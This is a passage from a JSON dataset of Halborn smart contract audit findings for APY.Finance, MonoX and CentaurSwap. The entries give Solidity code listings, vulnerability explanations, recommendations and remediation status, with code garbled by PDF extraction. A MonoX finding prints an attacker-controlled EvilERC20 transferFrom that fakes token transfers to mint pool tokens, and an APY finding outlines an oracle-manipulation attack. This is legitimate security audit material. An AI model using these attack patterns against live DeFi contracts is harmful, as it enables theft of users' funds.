from OracleAdapter contract was removed to avoid too early manual unlocking and lockFor function is protected by onlyContrac- tRole modifier. On the other hand, the emergencyUnlock function that can unlock contract immediately (in case of emergency) is protected by onlyEmergencyRole modifier. 35 ",
        "labels": [
            "Halborn",
            "APY_Financial_Pentesting",
            "Severity: High"
        ]
    },
    {
        "title": "LOSS OF TOKENS WHEN TRANSACTS WITH SMALL QUANTITIES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/APY_Financial_Pentesting_Report_Halborn_Final.pdf",
        "body": "When a user calls addLiquidity function from PoolTokenV2 with a small quantity of stable coins (DAI / USDC / USDT), the internal function that calculates the APT tokens to be minted rounds-off the result to zero. So, the stable coins are added to its corresponding pool but no APT token is minted for the user and generates a very slight imbalance on stable coin / APT ratio. If this issue repeats enough times, the imbalance could lead to APT tokens being mispriced, allowing users to deposit or withdraw more or less than their fair share. A similar situation occurs when a user calls redeem function from PoolTo- kenV2 with a small quantity of APT tokens. Category: Code vulnerabilities and bounds checks Code location: Listing 5: PoolTokenV2.sol (Lines 237) external virtual override nonReentrant whenNotPaused 217 function addLiquidity ( uint256 depositAmount ) 218 219 220 221 222 223 224 225 226 { require (! addLiquidityLock , \" LOCKED \" ); require ( depositAmount > 0, \" AMOUNT_INSUFFICIENT \" ); require ( 36 S R O T C A F K S I R D E S A B L A N R E T N I 227 228 229 230 231 232 233 234 235 236 237 238 239 240 underlyer . allowance ( msg . sender , address ( this )) >= depositAmount , \" ALLOWANCE_INSUFFICIENT \" ); // solhint - disable - next - line not - rely - on - time lastDepositTime [ msg . sender ] = block . timestamp ; // calculateMintAmount () is not used because deposit value // is needed for the event uint256 depositValue = getValueFromUnderlyerAmount ( depositAmount ); uint256 poolTotalValue = getPoolTotalValue () ; uint256 mintAmount = _calculateMintAmount ( depositValue , poolTotalValue ); _mint ( msg . sender , mintAmount ); underlyer . safeTransferFrom ( msg . sender , address ( this ) , depositAmount ); Listing 6: PoolTokenV2.sol (Lines 280) external virtual override nonReentrant whenNotPaused 269 function redeem ( uint256 aptAmount ) 270 271 272 273 274 275 276 277 278 { require (! redeemLock , \" LOCKED \" ); require ( aptAmount > 0, \" AMOUNT_INSUFFICIENT \"); require ( aptAmount <= balanceOf ( msg . sender ) , \" 279 280 281 282 283 284 285 286 287 BALANCE_INSUFFICIENT \" ); uint256 redeemUnderlyerAmt = getUnderlyerAmountWithFee ( aptAmount ); require ( redeemUnderlyerAmt <= underlyer . balanceOf ( address ( this )) , \" RESERVE_INSUFFICIENT \" ); _burn ( msg . sender , aptAmount ); underlyer . safeTransfer ( msg . sender , redeemUnderlyerAmt ); 37 S R O T C A F K S I R D E S A B L A N R E T N I Risk Level: Likelihood - 3 Impact - 1 Recommendations: Add a require function just after calculating APT tokens to be minted (when adding liquidity) or stable coins to be returned (when redeeming). Revert the operation if the result is not greater than zero. Remediation plan: SOLVED: After further review, APY.Finance team concluded that there was no way to slowly drain funds from the pool for other users. It could only be used to slowly lose funds for the attacker by depositing tiny amounts and receiving no APT tokens, or redeeming tiny amounts of APT and receiving no funds for it. Because the additional gas cost of implementing verification exceeded the expected loss to a user from improper use of the feature during normal operation, APY.Finance team decided that it was in the best interest of the user base not to include the verification smart contracts. Instead, what they have done is prevent tiny amounts (< 0.01)from being deposited or redeemed in the front-end UI. In this way, one user cannot accidentally lose a small amount of funds and other users are not affected by the rising cost of gas. 38 S R O T C A F K S I R D E S A B L A N R E T N I ",
        "labels": [
            "Halborn",
            "APY_Financial_Pentesting",
            "Severity: Low"
        ]
    },
    {
        "title": "INSUFFICIENT PROTECTION FOR ORACLE ADAPTER COULD LEAD TO TVL / PRICE MANIPULATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/APY_Financial_Pentesting_Report_Halborn_Final.pdf",
        "body": "Currently, the following critical functions on OracleAdapter contract are protected by onlyOwner modifier:  Set TVL value: setTvl  Set TVL aggregator source: setTvlSource  Set asset aggregator sources: setAssetSources, setAssetSource If private key of contract owner is compromised, an attacker could manipulate TVL or prices to create a great imbalance on stable coin / APT ratio and withdraw much more than allowed. Attack scenario: A step-by-step attack scenario will be described along with screenshots extracted from proof of concept (PoC) script, which is included on security-assessment/fake_tvl.js file as an attachment for this report. The smart contract called FakeAggregator.sol, which is used for this security test, is also included as an attachment. 1. Attacker deposits its stable coins into a pool. 39 S R O T C A F K S I R D E S A B L A N R E T N I 2. On the other side, attacker deploys a fake TVL aggregator, which return value can be manipulated anytime by him. 3. Attacker defines the desired value to be returned by fake TVL aggregator. 4. If attacker compromises the private key of OracleAdapter owner, he is able to modify the TVL source to point to fake TVL aggregator previously deployed. 5. Once exploit is launched, we can see that attacker deposited 1M DAI but is able to withdraw more than 5M DAI, which represents a 418% excedent. 40 S R O T C A F K S I R D E S A B L A N R E T N I Category: Access control or ownership risks Code location: Functions to set TVL value and TVL aggregator source respectively: Listing 7: OracleAdapter.sol 156 157 158 159 160 161 162 163 164 function setTvl ( uint256 value , uint256 period ) external override locked onlyOwner { } // We do allow 0 values for submitted values submittedTvlValue = Value ( value , block . number . add ( period )) ; Listing 8: OracleAdapter.sol 174 175 176 177 178 function setTvlSource ( address source ) public onlyOwner { require ( source . isContract () , \" INVALID_SOURCE \" ); tvlSource = AggregatorV3Interface ( source ); emit TvlSourceUpdated ( source ); } S R O T C A F K S I R D E S A B L A N R E T N I 41 Functions to set asset aggregator sources: Listing 9: OracleAdapter.sol 185 function setAssetSources ( address [] memory assets , address [] memory 186 187 188 189 190 191 192 193 sources ) public onlyOwner { } require ( assets . length == sources . length , \" INCONSISTENT_PARAMS_LENGTH \" ); for ( uint256 i = 0; i < assets . length ; i ++) { setAssetSource ( assets [ i ], sources [ i ]) ; } Listing 10: OracleAdapter.sol 200 function setAssetSource ( address asset , address source ) public onlyOwner { require ( source . isContract () , \" INVALID_SOURCE \" ); assetSources [ asset ] = AggregatorV3Interface ( source ); emit AssetSourceUpdated ( asset , source ); 201 202 203 204 } Risk Level: Likelihood - 1 Impact - 5 Recommendations: Security measures to reduce risk level for this finding:  For an adequate segregation of duties, create an emergency role (multisig wallet) to manage critical functions on OracleAdapter. This role must be different from the one used for day-to-day operations (e.g.: fund LP Safe). 42 S R O T C A F K S I R D E S A B L A N R E T N I  Configure this multisig wallet to have a reasonable number of owners and an appropriate number of required confirmations to transact. Remediation plan: SOLVED: Issue fixed in commit 8d4f1d4c4069ced8462ee95ec36d6ef9e12033e0. APY.Finance team defined the onlyEmergencyRole modifier to restrict access to aforementioned functions to the emergency role (multisig wallet). S R O T C A F K S I R D E S A B L A N R E T N I 43 EXTERNAL BASED RISK FACTORS 44 ",
        "labels": [
            "Halborn",
            "APY_Financial_Pentesting",
            "Severity: Medium"
        ]
    },
    {
        "title": "LACK OF INTERNAL MECHANISMS TO DETECT ABNORMAL VALUES FROM ORACLES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/APY_Financial_Pentesting_Report_Halborn_Final.pdf",
        "body": "The functions on OracleAdapter contract that get the TVL and asset price values from oracles (getTvl and getAssetPrice respectively) do not include previous validations to verify if received answer is abnormal or has been severely manipulated. Attack scenario: 1. Attacker deposits its stable coins into a pool. 2. If TVL aggregator is compromised (external attacks or internal fraud), attacker is able to modify the oracles it feeds from to fake ones that inflate the actual TVL value. 3. Attacker and legitimate users as well are able to withdraw much more stable coins than allowed. Category: Oracle attacks Code location: Listing 11: OracleAdapter.sol (Lines 231) 227 function getTvl () external view override unlocked returns ( uint256 ) { } 228 229 230 231 232 if ( block . number < submittedTvlValue . periodEnd ) { return submittedTvlValue . value ; } return _getPriceFromSource ( tvlSource ); 45 S R O T C A F K S I R D E S A B L A N R E T X E Listing 12: OracleAdapter.sol (Lines 250) 239 function getAssetPrice ( address asset ) 240 241 242 243 244 245 246 public view override unlocked returns ( uint256 ) { if ( block . number < submittedAssetValues [ asset ]. periodEnd ) { return submittedAssetValues [ asset ]. value ; } AggregatorV3Interface source = assetSources [ asset ]; return _getPriceFromSource ( source ); 247 248 249 250 251 } Risk Level: Likelihood - 1 Impact - 5 Recommendations: Calculate TVL value on-chain each time an asset allocation is added or removed. If not possible due to technical restrictions / excessive gas consumption, it is advisable to adopt the following security measures to reduce risk level for this finding:  Each time getAssetPrice is called, store the latest answer on contract. If a new answer received from price aggregator deviates more than a predefined threshold (e.g: 10%), use instead the latest stored value on contract or fallback to a backup price aggregator.  Monitor event ConfigSet to detect timely if there has been logic or oracle (also called transmitters) updates. For this task is possible to integrate OpenZeppelin Defender platform. With Defender, Sentinels are used OffchainAggregator contract from 46 S R O T C A F K S I R D E S A B L A N R E T X E to automatically monitor and respond to events, functions, and transaction parameters on smart contracts. Also with full Autotask integration, it is feasible to add circuit breakers or automated actions, so APY.Finance team can receive notifications via email, Slack, Telegram or Discord.  Because of min-max TVL values have been set immutably during Of- fchainAggregator contract deployment, it is advisable to revert operations that could make TVL value be outside the min-max range. It is also possible to ask Chainlink team to upgrade the logic of the contract if necessary. Remediation plan: SOLVED: APY.Finance team examined different ways of detecting abnormal oracle values, the most important of which was proper detection of zero values. Zero values require special attention because when a Chainlink However, there are aggregator fails, it could return a zero value. certain valid states of the system in which the TVL can also be zero, such as before the initial deployment of liquidity, or if all liquidity is unwound to deploy a new LP account contract. To distinguish between valid and invalid zero values, the getTvl function of the OracleAdapter contract checks the totalSupply of mAPT. When the totalSupply of mAPT is zero, either the liquidity has not been transferred from the LP Account from the pools or all liquidity from the LP Account has been moved back to the pools. A combination of zero mAPT totalSupply and zero TVL indicates a valid zero value. If the totalSupply of mAPT is greater than zero and the oracle still reads a zero TVL, the value should indicate a failure state, and the operation is reverted. Finally, APY.Finance team decided to detect skew with off-chain monitoring of events that can be responded to using OpenZeppelin Defender. 47 S R O T C A F K S I R D E S A B L A N R E T X E THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "APY_Financial_Pentesting",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNRESTRICTED POOL TOKEN MINTING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MonoX_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "One of MonoXs main objectives is to allow users for listing ERC20 tokens without the need for providing liquidity. In order to keep track of users shares in pools, a corresponding amount of liquidity pool tokens is minted to providers. The exact amount to be minted depends on e.g. the declared amount of ERC20 tokens added to the pool and the token price, intially set by the provider. use the token function the MonoX transfer. addLiquidityPair handle to OpenZeppelins In function This safeTransferFrom calls transferFrom in the token contract to actually execute the transfer. However, since the actual amount transferred ie. the delta of previous (before transfer) and current (after transfer) balance is not verified, a malicious user may list a custom ERC20 token with the transferFrom function modified in such a way that it e.g. does not transfer any tokens at all and the attacker is still going to have their liquidity pool tokens minted anyway. Code Location: Attacker-controlled example ERC20 token contract Listing 1: EvilERC20.sol (Lines 10) ) 1 function transferFrom ( address from , 2 address to , 3 4 uint256 value 5 6 7 8 9 10 public override returns ( bool ) value = 1; { 13 require ( value <= _balances [ from ]) ; require ( value <= _allowed [ from ][ msg . sender ]) ; require ( to != address (0) ) ; _balances [ from ] = _balances [ from ]. sub ( value ); _balances [ to ] = _balances [ to ]. add ( value ); _allowed [ from ][ msg . sender ] = _allowed [ from ][ msg . sender ]. sub ( value ); emit Transfer ( from , to , value ); return true ; } 11 12 13 14 15 16 17 18 19 20 MonoX Listing 2: Monoswap.sol (Lines 235,236) 231 function listNewToken ( address _token , uint112 _price , 232 233 234 235 236 uint256 vusdAmount , uint256 tokenAmount , address to ) public returns ( uint _pid , uint256 liquidity ) { _pid = _createPool ( _token , _price , PoolStatus . LISTED ); liquidity = addLiquidityPair ( _token , vusdAmount , tokenAmount , to ); 237 } Listing 3: Monoswap.sol (Lines 253,258,261,164,267) 251 252 253 254 255 256 257 258 259 260 261 262 _mintFee ( pool . pid , pool . lastPoolValue , poolValue ); uint256 _totalSupply = monoXPool . totalSupplyOf ( pool . pid ); IERC20 ( _token ). safeTransferFrom ( msg . sender , address ( monoXPool ) , tokenAmount ); if ( vusdAmount >0) { vUSD . safeTransferFrom ( msg . sender , address ( monoXPool ) , vusdAmount ); } uint256 liquidityVusdValue = vusdAmount . add ( tokenAmount . mul ( pool . price ) /1 e18 ); if ( _totalSupply ==0) { liquidity = liquidityVusdValue . sub ( MINIMUM_LIQUIDITY ); mint ( owner () , pool . pid , MINIMUM_LIQUIDITY ); // sorry , oz 14 doesn 't allow minting to address (0) } else { liquidity = _totalSupply . mul ( liquidityVusdValue ). div ( poolValue ); } mint ( to , pool . pid , liquidity ); 263 264 265 266 267 268 } OpenZeppelin Listing 4: SafeERC20.sol (Lines 24,25) using Address for address ; 17 library SafeERC20 { 18 19 20 function safeTransfer ( IERC20 token , address to , uint256 value ) internal { _callOptionalReturn ( token , abi . encodeWithSelector ( token . transfer . selector , to , value )) ; } function safeTransferFrom ( IERC20 token , address from , address to , uint256 value ) internal { _callOptionalReturn ( token , abi . encodeWithSelector ( token . transferFrom . selector , from , to , value )) ; } 21 22 23 24 25 26 Recommendation: Whenever tokens are transferred, the delta of the previous (before trans- fer) and current (after transfer) token balance should be verified to match the user-declared token amount. Remediation Plan: SOLVED: Fixed in commit #635a4cee2f2e50d854e06cac47c48aa0fafde2b0. The amount to be minted is calculated now based on the delta of account balance before and after transfer. 15 ",
        "labels": [
            "Halborn",
            "MonoX",
            "Severity: High"
        ]
    },
    {
        "title": "POOL BLOCKING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MonoX_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "One of MonoXs main objectives is to allow users for listing ERC20 tokens without the need for providing liquidity. Users can set arbitrary prices for tokens they list because the Monoswap.sol contract does not verify them against third-party data sources. The price of a given token can be updated only if it has not been swapped for at least 6000 blocks since the last exchange. In consequence, since the contract does not enforce minimum or maximum transaction amount, a malicious user can list tokens, price them way above market rate and keep the price on that level by doing microexchanges once every 6000 blocks thus effectively DoSing the pool. Code Location: Listing 5: Monoswap.sol (Lines 235) 231 function listNewToken ( address _token , uint112 _price , 232 233 234 235 236 uint256 vusdAmount , uint256 tokenAmount , address to ) public returns ( uint _pid , uint256 liquidity ) { _pid = _createPool ( _token , _price , PoolStatus . LISTED ); liquidity = addLiquidityPair ( _token , vusdAmount , tokenAmount , to ); 237 } Listing 6: Monoswap.sol (Lines 189,196) 177 function _createPool ( address _token , uint112 _price , PoolStatus _status ) lock internal returns ( uint256 _pid ) require ( tokenPoolStatus [ _token ]==0 , \" Monoswap : Token Exists \"); require ( _token != address ( vUSD ) , \" Monoswap : vUSD pool not { allowed \" ); _pid = poolSize ; pools [ _token ] = PoolInfo ({ token : _token , pid : _pid , 178 179 180 181 182 183 16 184 185 186 187 188 189 190 191 192 193 194 195 196 197 } vusdCredit : 0, vusdDebt : 0, tokenBalance : 0 , lastPoolValue : 0, status : _status , price : _price }) ; poolSize = _pid . add (1) ; tokenPoolStatus [ _token ]=1; // initialze pool 's lasttradingblocknumber as the block number on which the pool is created lastTradedBlock [ _token ] = block . number ; Listing 7: Monoswap.sol (Lines 463) 454 function swapExactTokenForToken ( 455 456 457 458 459 460 461 462 address tokenIn , address tokenOut , uint amountIn , uint amountOutMin , address to , uint deadline ) external virtual ensure ( deadline ) returns ( uint amountOut ) { amountOut = swapIn ( tokenIn , tokenOut , msg . sender , to , amountIn ); 463 require ( amountOut >= amountOutMin , ' Monoswap : INSUFFICIENT_OUTPUT_AMOUNT '); 464 } Listing 8: Monoswap.sol (Lines 561) 560 561 // record last trade 's block number in mapping : lastTradedBlock lastTradedBlock [ _token ] = block . number ; Listing 9: Monoswap.sol (Lines 163) 156 function updatePoolPrice ( address _token , uint112 _newPrice ) public onlyOwner { 17 157 158 159 160 161 162 163 164 165 166 } require ( _newPrice > 0, ' Monoswap : zeroPriceNotAccept '); require ( tokenPoolStatus [ _token ] != 0, \" Monoswap : PoolNotExist \" ); PoolInfo storage pool = pools [ _token ]; require ( pool . price != _newPrice , \" Monoswap : SamePriceNotAccept \"); require ( block . number > lastTradedBlock [ _token ]. add (6000) , \" Monoswap : PoolPriceUpdateLocked \"); pool . price = _newPrice ; lastTradedBlock [ _token ] = block . number ; Recommendation: If possible, its recommended to validate tokens prices (by the use of oracles) on initial listing and on every subsequent price change in order not to allow for manipulating the exchange by malicious users. Additionally, a minimum/maximum input/output amount of tokens could be enforced. Reference: Chainlink Price Oracle Remediation Plan: SOLVED: Fixed in commit #635a4cee2f2e50d854e06cac47c48aa0fafde2b0. Con- tract owner can now pause pools and temporarily disable swapping so that users with the PriceAdjuster role (assigned by the contract owner) can update prices. 18 ",
        "labels": [
            "Halborn",
            "MonoX",
            "Severity: High"
        ]
    },
    {
        "title": "ROLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MonoX_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In smart contracts, implementing a correct Access Control policy is an essential step to maintain security and decentralization for permissions on a token. All the features of the smart contract , such as mint/burn tokens and pause contracts are given by Access Control. For instance, Ownership is the most common form of Access Control. In other words, the owner of a contract (the account that deployed it by default) can do some administrative tasks on it. Nevertheless, other authorization levels are required to follow the principle of least privilege, also known as least authority. Briefly, any process, user or program only can access to the necessary resources or information. Otherwise, the ownership role is useful in a simple system, but more complex projects require the use of more roles by using Role-based access control. Code Location: Listing 10: Monoswap.sol (Lines 130,134,139,145,156) feeTo = _feeTo ; require ( _fees <1 e3 , \" fees too large \" ); fees = _fees ; 130 function setFeeTo ( address _feeTo ) onlyOwner external { 131 132 } 133 134 function setFees ( uint16 _fees ) onlyOwner external { 135 136 137 } 138 139 function setDevFee ( uint16 _devFee ) onlyOwner external { 140 141 142 } 143 144 // update status of a pool . onlyOwner . 145 function updatePoolStatus ( address _token , PoolStatus _status ) require ( _devFee <1 e3 , \" devFee too large \" ); devFee = _devFee ; public onlyOwner { 19 PoolInfo storage pool = pools [ _token ]; pool . status = _status ; 146 147 148 } 149 150 /* * 151 @dev update pools price if there were no active trading for the last 6000 blocks 152 @notice Only owner callable , new price can neither be 0 nor be equal to old one @param _token pool identifider ( token address ) @param _newPrice new price in wei ( uint112 ) 153 154 155 */ 156 function updatePoolPrice ( address _token , uint112 _newPrice ) public 157 onlyOwner { require ( _newPrice > 0, ' Monoswap : zeroPriceNotAccept '); Recommendation: Its recommended to use role-based access control based on the principle of least privilege to lock permissioned functions using different roles. Reference: Least Privilege Principle Remediation Plan: SOLVED: Fixed in commit #635a4cee2f2e50d854e06cac47c48aa0fafde2b0. Sev- eral new roles were introduced. 20 ",
        "labels": [
            "Halborn",
            "MonoX",
            "Severity: High"
        ]
    },
    {
        "title": "INTEGER OVERFLOW",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MonoX_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "An overflow happens when an arithmetic operation reaches the maximum size of a type. For instance, in Monoswap.sol, the getAmountOut method is subtracting fees from a fixed number and may end up overflowing the integer since the resulting value is not checked to be greater or equal 0. In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum representable value. Code Location: Listing 11: Monoswap.sol (Lines 638) 633 function getAmountOut ( address tokenIn , address tokenOut , 634 uint256 amountIn ) public view returns ( uint256 tokenInPrice , 635 636 637 638 639 uint256 tokenOutPrice , uint256 amountOut , uint256 tradeVusdValue ) { require ( amountIn > 0, ' Monoswap : INSUFFICIENT_INPUT_AMOUNT '); uint256 amountInWithFee = amountIn . mul (1 e5 - fees ) /1 e5 ; address vusdAddress = address ( vUSD ); Listing 12: Monoswap.sol (Lines 584) 579 function getAmountIn ( address tokenIn , address tokenOut , 580 uint256 amountOut ) public view returns ( uint256 tokenInPrice , 581 582 583 584 585 uint256 tokenOutPrice , uint256 amountIn , uint256 tradeVusdValue ) { require ( amountOut > 0, ' Monoswap : INSUFFICIENT_INPUT_AMOUNT '); uint256 amountOutWithFee = amountOut . mul (1 e5 + fees ) /1 e5 ; address vusdAddress = address ( vUSD ); 21 Recommendation: It is recommended to use vetted safe math libraries for arithmetic oper- ations consistently throughout the smart contract system Reference: Ethereum Smart Contract Best Practices - Integer Overflow and Underflow Remediation Plan: SOLVED: MonoX is certain the integers reported will not overflow since the fees variable cannot be assigned value greater than 1e3. 22 ",
        "labels": [
            "Halborn",
            "MonoX",
            "Severity: Medium"
        ]
    },
    {
        "title": "EXTERNAL FUNCTION CALLS WITHIN LOOP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MonoX_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In on Calls inside a loop might lead to a denial-of-service attack. of the functions discovered there is a for loop on variable pid that iterates up to the poolInfo array length. If this integer is evaluated at extremely large numbers this can cause a DoS. Code Location: Listing 13: MonoswapStaking.sol (Lines 241) uint256 length = poolInfo . length ; for ( uint256 pid = 0; pid < length ; ++ pid ) { 236 function massUpdatePools () public { 237 238 239 240 241 242 243 } updatePool ( pid ); } PoolInfo storage pool = poolInfo [ pid ]; if ( pool . bActive ) Recommendation: If possible, use pull over push strategy for external calls. Remediation Plan: SOLVED: MonoX is certain the DoS scenario is highly unlikely here since all external calls in this loop are made to MonoX-controlled contracts. 23 ",
        "labels": [
            "Halborn",
            "MonoX",
            "Severity: Low"
        ]
    },
    {
        "title": "DIVIDE BEFORE MULTIPLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MonoX_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "Solidity integer division might truncate. As a result, performing mul- tiplication before division can sometimes avoid loss of precision. In this audit, there are multiple instances found where division is being performed before multiplication operation in contract file. Code Location: Listing 14: MonoswapStaking.sol (Lines 221) 220 if ( user . oldReward > 0) { 221 monoReward = monoReward . add ( user . oldReward . mul ( stakedAmount ). div ( user . amount ). mul (1 e12 )) ; 222 } Recommendation: Consider doing multiplication operation before division to prevail pre- cision in the values in non floating data type. Remediation Plan: SOLVED: fixed in commit #ac21bee3f7f1d7df3529907b0afb0470b0236d07 24 ",
        "labels": [
            "Halborn",
            "MonoX",
            "Severity: Low"
        ]
    },
    {
        "title": "ADDRESS VALIDATION MISSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MonoX_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "Address validation is missing in multiple functions in contracts Monoswap .sol and MonoXPool.sol. This may result with users irreversibly locking their tokens when incorrect address is provided. Code Location: Listing 15: Monoswap.sol (Lines 169,173) 168 function mint ( address account , uint256 id , uint256 amount ) internal { monoXPool . mint ( account , id , amount ); 169 170 } 171 172 function burn ( address account , uint256 id , uint256 amount ) internal { monoXPool . burn ( account , id , amount ); 173 174 } Listing 16: MonoXPool.sol (Lines 20) 19 constructor ( address _WETH ) { 20 WETH = _WETH ; 21 } Listing 17: MonoXPool.sol (Lines 28,33) 26 function mint ( address account , uint256 id , uint256 amount ) public onlyOwner { totalSupply [ id ]= totalSupply [ id ]. add ( amount ); _mint ( account , id , amount , \" \"); 27 28 29 } 30 31 function burn ( address account , uint256 id , uint256 amount ) public onlyOwner { 25 totalSupply [ id ]= totalSupply [ id ]. sub ( amount ); _burn ( account , id , amount ); 32 33 34 } Recommendation: Add proper address validation when assigning a value to a variable from user-supplied data. Better yet, address white-listing/black-listing should be implemented in relevant functions if possible. Remediation Plan: PARTIALLY SOLVED: Vulnerable function calls in Monoswap.sol have been removed but address validation is missing in MonoXPool.sol. 26 ",
        "labels": [
            "Halborn",
            "MonoX",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF BLOCK.TIMESTAMP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MonoX_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "block.timestamp can be influenced by miners to a certain degree, so the testers should be warned that this may have some risk if miners collude on time manipulation to influence the price oracles. Code Location: Listing 18: Monoswap.sol (Lines 86) 85 modifier ensure ( uint deadline ) { 86 87 88 } require ( deadline >= block . timestamp , ' Monoswap : EXPIRED '); _; Recommendation: Use block.number instead of block.timestamp to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: SOLVED: MonoX does not require timestamps to be extremely precise here (timescales are greater than 900 seconds) 27 ",
        "labels": [
            "Halborn",
            "MonoX",
            "Severity: Low"
        ]
    },
    {
        "title": "TAUTOLOGY EXPRESSIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MonoX_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In contract Monoswap.sol, tautology expressions have been detected. Such expressions are of no use since they always evaluate true/false regardless of the context they are used in. Code Location: Listing 19: Monoswap.sol (Lines 546) 544 if ( _poolStatus == PoolStatus . LISTED ){ 545 546 require ( _vusdCredit >=0 && _vusdDebt ==0 , \" Monoswap : unofficial pool cannot bear debt \"); 547 } Recommendation: Correct the expressions. Since _vusdCredit variable is declared as type uint256, it is always greater or equal to 0. Remediation Plan: SOLVED: Tautology Expression was removed in commit #635a4cee2f2e50d854e06cac47c48aa0fafde2b0. 28 3.10 (HAL-10) POSSIBLE MISUSE OF PUBLIC FUNCTIONS - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "MonoX",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNDEFINED ROLE ON THE UNLOCK FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Timelock_Smart_Contract_Security_Audit_v1_1.pdf",
        "body": "In the CentaurFactoryTimeLock.sol contract, the timelock mechanism has However, this function is been implemented through unlock function. In the other hand, the authorized through EMERGENCY_MAINTAINER_ROLE. contract defined TIMELOCK_ADMIN_ROLE role. The TIMELOCK_ADMIN_ROLE role should be authorized by the function(unlock). Code Location: CentaurFactoryTimeLock.sol Line #49 Listing 1: CentaurFactoryTimeLock.sol (Lines 49) 49 50 51 52 function unlock () external onlyRole ( EMERGENCY_MAINTAINER_ROLE ) { PENDING_UNLOCK = true ; UNLOCK_TIMESTAMP = ( block . timestamp ). add ( TIMELOCK_PERIOD ); } Risk Level: Likelihood - 2 Impact - 3 Recommendation: The TIMELOCK_ADMIN_ROLE function should be modifier for the timelock function. 13 Listing 2: CentaurFactoryTimeLock.sol (Lines 49) 49 50 51 52 function unlock () external onlyRole ( TIMELOCK_ADMIN_ROLE ) { PENDING_UNLOCK = true ; UNLOCK_TIMESTAMP = ( block . timestamp ). add ( TIMELOCK_PERIOD ); } Remediation Plan: ACKNOWLEDGED: CentaurSwap Team claims that this is intended behaviour of the function. Only the EMERGENCY_MAINTAINER_ROLE can initiate unlock and emergency withdraw because it will be governed by a 6/6 Multisig. 14 ",
        "labels": [
            "Halborn",
            "CentaurSwap_Timelock",
            "Severity: Low"
        ]
    },
    {
        "title": "REDUNDANT CODE IN THE CONDITION STATEMENT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Timelock_Smart_Contract_Security_Audit_v1_1.pdf",
        "body": "The conditional statement on CentaurFactoryTimeLock.sol contains the code It is infeasible for msg.sender to ever hasRole(role, address(0)). Consider simplifying this to hasRole(role, be equal to address(0). _msgSender()). Code Location: CentaurFactoryTimeLock.sol Line #31 Listing 3: CentaurFactoryTimeLock.sol (Lines 31) 30 31 32 33 modifier onlyRole ( bytes32 role ) { require ( hasRole ( role , _msgSender () ) || hasRole ( role , address (0) ) , \" CentaurFactoryTimeLock : NO_PERMISSION \" ); _ ; } Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to delete hasRole(role, address(0)) conditional state- ment from the modifier. The sample solution can be seen below. Listing 4: CentaurFactoryTimeLock.sol (Lines 31) 30 modifier onlyRole ( bytes32 role ) { 15 31 32 33 require ( hasRole ( role , _msgSender () ) , \" CentaurFactoryTimeLock : NO_PERMISSION \" ); _ ; } Remediation Plan: SOLVED: Conditional statement was removed. The CentaurSwap Team updated the relevant contract. 16 ",
        "labels": [
            "Halborn",
            "CentaurSwap_Timelock",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF TIMELOCK SETTER FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Timelock_Smart_Contract_Security_Audit_v1_1.pdf",
        "body": "During the tests, It has been observed that TIMELOCK_PERIOD does not have any function for setting new timelock period. Code Location: Listing 5: CentaurFactoryTimeLock.sol (Lines 21) 21 uint public TIMELOCK_PERIOD = 1 days ; Recommendation: It is recommended to define function for setting new timelock period. Also, this function should have MAXIMUM_DELAY and MINIMUM_DELAY state- ments on the timelock. Remediation Plan: SOLVED: CentaurSwap Team declared TIMELOCK_PERIOD state variable as con- stant. They do not intend to modify the timelock period. 17 ",
        "labels": [
            "Halborn",
            "CentaurSwap_Timelock",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING EVENT HANDLER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Timelock_Smart_Contract_Security_Audit_v1_1.pdf",
